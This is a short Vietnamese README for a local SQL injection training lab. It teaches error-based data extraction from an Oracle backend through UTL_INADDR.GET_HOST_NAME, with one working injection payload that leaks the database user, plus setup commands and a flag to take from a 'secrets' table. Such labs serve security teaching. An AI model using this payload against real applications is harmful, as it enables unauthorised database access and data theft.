# SQLi-014: Oracle UTL_INADDR Error-based

## 🎯 Mục Tiêu
Sử dụng **UTL_INADDR.GET_HOST_NAME()** để extract data trong Oracle.

## 📝 Kịch Bản
Customer portal query với Oracle backend.

**URL:** `http://localhost:5014/customer?id=1`

## 🎓 Kiến Thức
```sql
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--
```
Error: `ORA-29257: host XXX unknown`

## 🚀 Chạy Lab
```bash
docker-compose up -d  # Oracle cần ~2 phút khởi động
# http://localhost:5014
```

## 🏁 Flag
Extract từ bảng `secrets`.
